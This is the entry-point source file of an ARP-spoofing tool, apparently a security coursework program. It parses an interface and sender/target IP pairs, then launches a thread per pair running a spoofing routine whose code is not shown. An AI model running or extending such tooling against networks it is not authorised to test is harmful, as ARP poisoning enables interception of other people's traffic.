#include <cstdio>
#include <unistd.h>
#include <pthread.h>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "arp_spoof.h"

void usage()
{
	printf("syntax: arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
	printf("sample: arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int main(int argc, char *argv[])
{
	if (argc < 4 || argc % 2 != 0)
	{
		usage();
		return -1;
	}

	char *interface = argv[1];
	char *sender_ip = argv[2];
	char *target_ip = argv[3];

	int ip_sets_count = (argc - 2) / 2;
	std::string mac_addr_path = "/sys/class/net/";
	mac_addr_path += interface;
	mac_addr_path += "/address";

	Mac myMac = Mac::getMyMac(mac_addr_path.c_str()); // host's mac
	Ip myIp = Ip::getMyIp(interface);				  // vm's ip

	pthread_t *pthread = (pthread_t *)malloc(sizeof(pthread_t) * ip_sets_count);
	int status;

	for (int i = 0; i < ip_sets_count; i++)
	{
		ArpSpoofReqs *arpSpoofReqs_t = (ArpSpoofReqs *)malloc(sizeof(ArpSpoofReqs));
		ArpReqs arpReqs_t = ArpReqs(Mac(), Mac(), Ip(argv[i * 2 + 2]), Ip(argv[i * 2 + 3]));
		arpSpoofReqs_t->arpReqs_ = arpReqs_t;
		arpSpoofReqs_t->myIp_ = myIp;
		arpSpoofReqs_t->myMac_ = myMac;
		arpSpoofReqs_t->interface_ = interface;

		pthread_create(&pthread[i], NULL, t_arp_spoof, (void *)arpSpoofReqs_t);
	}
	for (int i = 0; i < ip_sets_count; i++)
		pthread_join(pthread[i], (void **)&status);

	return 1;
}
